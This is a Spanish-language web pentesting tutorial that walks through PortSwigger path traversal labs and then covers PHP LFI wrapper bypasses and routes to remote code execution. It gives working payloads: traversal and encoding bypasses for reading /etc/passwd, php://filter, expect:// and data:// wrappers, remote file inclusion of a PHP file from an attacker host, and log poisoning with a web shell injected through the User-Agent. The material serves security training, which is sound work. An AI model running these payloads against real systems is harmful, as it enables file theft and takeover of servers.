# ¿Qué es Path Traversal?

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/path-traversal-banner.png">

Path Traversal es una vulnerabilidad de seguridad web que permite a un atacante leer archivos arbitrarios de un servidor web, como archivos de configuración o contraseñas.

Aquí estarán las resoluciones de los laboratorios de [PortSwigger](https://portswigger.net/web-security/file-path-traversal)

# 1. Lab: File path traversal, simple case

> https://portswigger.net/web-security/file-path-traversal/lab-simple

Al entrar el laboratorio veremos esto:

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab1-lfi.png">

Si abrimos las imágenes en una nueva pestaña, veremos que se cargan mediante el parámetro ```filename?=image.jpg```

Si cambiamos el valor de ```image.jpg``` por ```../../../../../etc/passwd```

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/bypass1.png">

# 2. Lab: Traversal sequences blocked with absolute path bypass

> https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

Al ingresar al laboratorio, veremos lo mismo que antes. Por lo tanto, si intentamos acceder al archivo ```/etc/passwd``` mediante un path traversal, no lo podremos ver.
Pero no siempre es necesario poner ```../../../../../```, si no hay ningun tipo de proteccion aplicada, solo basta con poner la ruta absoluta, es decir ```/etc/passwd```

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/bypass2.png">

# 3. Lab: Traversal sequences stripped non-recursively

> https://0a9c008704527f84c0612cd700a000f5.web-security-academy.net/

Para no estar repitiendo lo mismo, cabe aclarar que todos los laboratorios son iguales, si ahora intentamos leer el archivo ```/etc/passwd```, ya sea haciendo uso de un path traversal o apuntando directamente, no podremos.

Supongamos que una página implementa como mecanismo de seguridad que nosotros al poner un ```../``` lo sustituya a nada, es decir, que nos lo elimine.

Ejemplo: 

```
../ ➜ " "
```

Una forma de bypassear esto es poniendo ```....//```, ya que al aplicar la sustitución nos quedara así
```
....//   ➜   ../
```

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/bypass3.png">

# 4. Lab: Traversal sequences stripped with superfluous URL-decode

> https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

Para poder resolver este laboratorio, debemos usar otra forma de bypassear las protecciones colocadas, una forma de apuntar al archivo ```/etc/passwd``` es URL Encodeando la barra, y luego el "%", es decir

```
../ ➜ ..%2f ➜ ..%252f
```

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/bypass4.png">

# 5. Lab: Validation of start of path

> https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path

En este laboratorio, nos muestran la ruta de la cual se cargan las imágenes ```filename=/var/www/images/imagen.jpg```, al igual que antes, simplemente basta con volver unos directorios hacia atrás, hasta llegar a la raíz

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/bypass5.png">

# 6. Lab: Validation of file extension with null byte bypass

> https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

Hay veces que como mecanismo de "proteccion", a nivel de código ponen que el archivo que se incluya tiene que tener una extensión definida, como por ejemplo ```.jpg```

Una función que podemos usar para saltarnos esta protección es usar el carácter ```"%00"```, con este carácter hacemos que todo lo que le siga se cancele

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/bypass6.png">

# Bypass via wrappers

Estas no son las únicas formas de bypassear protecciones, también podemos hacer uso de los wrappers.

# ¿Qué es un wrapper? 

En el contexto de las URLs, un ```wrapper``` es una forma de especificar el protocolo que se utilizará para recuperar el contenido de una URL
Algunos de los ```wrappers``` más conocidos son:

- ```file://``` ➜ Nos permite acceder a archivos locales.
- ```mailto:``` ➜ Para enviar un correo electrónico.
- ```ftp://``` ➜ Para acceder a recursos a través del protocolo FTP.
- ```data:``` ➜ Para incrustar datos directamente en la URL, como imágenes o archivos de audio.

Existen muchos más.

# Bypass via file wrapper

Con el wrapper ```file://``` podemos acceder a un archivo local directamente desde la URL

### Peticion de ejemplo:

```❯ curl -s -X GET "http://127.0.0.1/example.php?file=file:///etc/passwd"```

### Output:

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
onyx:x:1000:1000::/home/onyx:/bin/bash
```

# Bypass via base64 wrapper

Un wrapper que podemos utilizar para poder leer archivos internos de una maquina es: 

```php://filter/convert.base64-encode/resource=/etc/passwd```

Este wrapper hace que todo el contenido de un archivo indicado, sea encodeado en base64
### Peticion de ejemplo:

```❯ curl -s -X GET "http://127.0.0.1/example.php?file=php://filter/convert.base64-encode/resource=/etc/passwd"```

### Output:

``` 
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAp3d3ctZGF0YTp4OjMzOjMzOnd3dy1kYXRh
Oi92YXIvd3d3Oi91c3Ivc2Jpbi9ub2xvZ2luCm1haWw6eDo4Ojg6bWFpbDovdmFyL21haWw6L3Vz
ci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDI6MTA1Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3Rl
bnQ6L2Jpbi9mYWxzZQpvbnl4Ong6MTAwMDoxMDAwOjovaG9tZS9vbnl4Oi9iaW4vYmFzaAoK
```

### Decode:

```
❯ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAp3d3ctZGF0YTp4OjMzOjMzOnd3dy1kYXRhOi92YXIvd3d3Oi91c3Ivc2Jpbi9ub2xvZ2luCm1haWw6eDo4Ojg6bWFpbDovdmFyL21haWw6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDI6MTA1Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpvbnl4Ong6MTAwMDoxMDAwOjovaG9tZS9vbnl4Oi9iaW4vYmFzaAoK" | base64 -d
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
onyx:x:1000:1000::/home/onyx:/bin/bash
```

# Bypass via wrapper rot13
Un wrapper bastante útil, pero poco conocido (a mi parecer) es el wrapper de codificación en rot13

```php://filter/read=string.rot13/resource=/etc/passwd```

### Peticion de ejemplo:

```❯ curl -s -X GET "http://127.0.0.1/example.php?file=php://filter/read=string.rot13/resource=/etc/passwd"```

### Output:

```
ebbg:k:0:0:ebbg:/ebbg:/ova/onfu
jjj-qngn:k:33:33:jjj-qngn:/ine/jjj:/hfe/fova/abybtva
znvy:k:8:8:znvy:/ine/znvy:/hfe/fova/abybtva
zlfdy:k:102:105:ZlFDY Freire,,,:/abarkvfgrag:/ova/snyfr
ffuq:k:103:65534::/ine/eha/ffuq:/hfe/fova/abybtva
balk:k:1000:1000::/ubzr/balk:/ova/onfu
```

### Decode:

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
onyx:x:1000:1000::/home/onyx:/bin/bash
```

# Formas de pasar obtener un RCE

## Via Remote File Inclusion

Si la opción ```allow_url_include``` esta habilitada en el archivo ```php.ini```, podemos apuntar a archivos de una máquina remota, normalmente este archivo se encuentra en 

```/etc/php/VERSIO DE PHP/apache2/php.ini``` ➜ /etc/php/8.1/apache2/php.ini

### Explotación
En nuestra máquina de atacante crearemos un archivo ```.php``` que ejecute un comando, por ejemplo:

```
❯ cat rfi.php
<?php
    system("id");
?>
```

Ahora, en la página vulnerable al LFI, enviaremos una petición al archivo para intentar ejecutar el comando. Si todo funciona correctamente, el comando se ejecutará.

```
❯ curl -s -X GET "http://127.0.0.1/example.php?file=http://192.168.1.18/rfi.php"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Via wrapper expect

El wrapper ```expect``` nos permite ejecutar ya sean comando o programas directamente desde la URL

```
❯ curl -s -X GET "http://127.0.0.1/example.php?file=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Via wrapper data

El wrapper ```data``` se utiliza en casos en los que es necesario incrustar pequeños archivos o datos directamente en una página web

### Ejemplo
```
http://127.0.0.1/example.php?file=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
```
### Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Via Log Poisoning

Supongamos que tenemos un LFI en un sitio web, y mediante este LFI podemos apuntar a los logs de apache (por ejemplo)

Bueno, normalmente en estos logs, se suele ver el ```User-Agent``` del que tramito la petición al servidor web, y que podemos hacer con el ```User-Agent```? El ```User-Agent``` es una cabecera que la podemos modificar a nuestro gusto, por ende podemos inyectarle código en PHP (si es que la web lo interpreta) y así poder obtener una ejecución remota de comando.

```❯ curl -s "http://127.0.0.1/poisoning.php" -A "<?php system(\$_GET['cmd']); ?>"```

Una vez inyectado el ```User-Agent```, debemos tramitar otra petición al archivo log, seguido de un ```&cmd=<COMANDO>```

```
❯ curl -s -X GET "http://127.0.0.1/poisoning.php?file=/var/log/apache2/access.log&cmd=id"
127.0.0.1 - - "GET /poisoning.php HTTP/1.1" 200 147 "-" uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El ataque de log poisoning no solo se puede efectuar en los log de apache, también se puede apuntando a los logs de 

- SSH
- FPT
- SMPT

O cualquier servicio que contenga un archivo de registros

# Recursos

- ```https://gatogamer1155.github.io/otros/lfi_linux/```
- ```https://deephacking.tech/local-file-inclusion-lfi-pentesting-web/```
- ```https://portswigger.net/web-security/file-path-traversal```
- ```https://youtu.be/roG3r5tNWOU?t=288```
- ```https://book.hacktricks.xyz/pentesting-web/file-inclusion```
- ```https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal```
